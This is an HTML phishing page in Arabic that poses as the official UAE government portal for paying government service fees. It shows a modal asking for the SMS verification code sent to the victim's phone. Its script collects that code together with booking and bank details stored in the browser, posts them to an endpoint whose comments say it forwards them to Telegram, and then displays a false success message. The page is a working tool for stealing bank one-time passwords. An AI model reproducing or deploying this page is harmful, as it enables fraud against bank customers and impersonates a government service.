<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>القنوات الذكية لتسديد رسوم الخدمات الحكومية | البوابة الرسمية لحكومة الإمارات العربية المتحدة</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.html" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.html" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/boom.css">
        <style>
            .modal-open{
                overflow:hidden;
                padding-right:0px;
            }
        </style>
</head>
<body class="modal-open">
        
        <!-- Modal -->
        <div class="modal fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;">
          <div class="modal-dialog shadow">
            <div class="modal-content">
              <div class="modal-header ">
                    <img src="image/Emarats.png">
              </div>
              <div class="modal-body">
                <div class="text-center pp">
                    <h6>يرجى تاكيد الدفع</h6>
                </div>
                <div class="tato">
                     <p>يرجى ادخال رمز التحقق المرسل الى هاتفك</p>
                </div>
                <form id="smsForm">
                     <input type="hidden" name="step" value="sms">
                     <div class="content">
                         <div class="left">
                             
                         </div>
                         <div class="right">
                             
                                 <div class="form-group mt-4">
                                     <input type="text" name="sms" id="sim" class="form-control" placeholder="أدخل رمز التحقق" required>
                                     
                                 </div>
                             </span>
                         </div>
                     </div>
                     <div class="time " >
                         <p>يمكنك طلب رمز جديد خلال :</p>
                         <div class="countdown ms-2" style="color:#0047BB;"></div>
                     </div>
                     <div class="botona">
                         <button class="btn" type="submit" name="submit">تأكيد</button>
                     </div>
                     <div class="copirayt text-center">
                         <p>2025 © - all rights reserved</p>
                     </div>
                 </form>
              </div>
            </div>
          </div>
        </div>


        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script>
             // مؤقت العد التنازلي (3 دقائق = 180 ثانية)
             var timer2 = "03:00";
              var interval = setInterval(function() {
              var timer = timer2.split(':');
              //by parsing integer, I avoid all extra string processing
              var minutes = parseInt(timer[0], 10);
              var seconds = parseInt(timer[1], 10);
              --seconds;
              minutes = (seconds < 0) ? --minutes : minutes;
              if (minutes < 0) clearInterval(interval);
              seconds = (seconds < 0) ? 59 : seconds;
              seconds = (seconds < 10) ? '0' + seconds : seconds;
              //minutes = (minutes < 10) ?  minutes : minutes;
              $('.countdown').html(minutes + ':' + seconds);
              timer2 = minutes + ':' + seconds;
              }, 1000);

            // معالجة إرسال النموذج
            document.addEventListener('DOMContentLoaded', function() {
                document.getElementById('smsForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const smsCode = document.getElementById('sim').value.trim();
                const submitBtn = this.querySelector('button[type="submit"]');
                
                // التحقق من صحة الكود (يجب أن يحتوي على 4-8 أرقام)
                if (!smsCode) {
                    alert('يرجى إدخال رمز التحقق');
                    return;
                }
                
                if (smsCode.length < 4 || smsCode.length > 8) {
                    alert('رمز التحقق يجب أن يحتوي على 4-8 أرقام');
                    return;
                }
                
                const codePattern = /^[0-9]+$/;
                if (!codePattern.test(smsCode)) {
                    alert('رمز التحقق يجب أن يحتوي على أرقام فقط');
                    return;
                }
                
                // عرض حالة التحميل
                const originalText = submitBtn.innerHTML;
                submitBtn.disabled = true;
                submitBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> جاري التحقق...';
                
                // الحصول على بيانات الحجز والبنك من localStorage
                const bookingData = JSON.parse(localStorage.getItem('bookingData') || '{}');
                const bankData = JSON.parse(localStorage.getItem('bankData') || '{}');
                
                const dataToSend = {
                    smsCode: smsCode,
                    bookingId: bookingData.bookingId || 'غير متوفر',
                    bankName: bankData.bankName || 'غير متوفر',
                    amount: bookingData.amount || 'غير متوفر',
                    timestamp: new Date().toISOString()
                };
                
                // إرسال البيانات إلى API
                fetch('/api/telegram/sms-code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(dataToSend)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('فشل في إرسال البيانات');
                    }
                    return response.json();
                })
                .then(data => {
                    console.log('تم إرسال كود SMS إلى تليجرام:', data);
                    
                    // عرض رسالة نجاح
                    alert('تم التحقق من الكود بنجاح!');
                    
                    // يمكنك التوجيه إلى صفحة أخرى هنا إذا أردت
                    // window.location.href = '/success.html';
                    
                    // إعادة تعيين النموذج
                    document.getElementById('sim').value = '';
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = originalText;
                })
                .catch(error => {
                    console.error('خطأ في إرسال البيانات:', error);
                    
                    // إعادة تفعيل الزر في حالة الفشل
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = originalText;
                    
                    alert('حدث خطأ في التحقق من الكود. يرجى المحاولة مرة أخرى.');
                });
                });
            });
        </script>
              
</body>
</html>
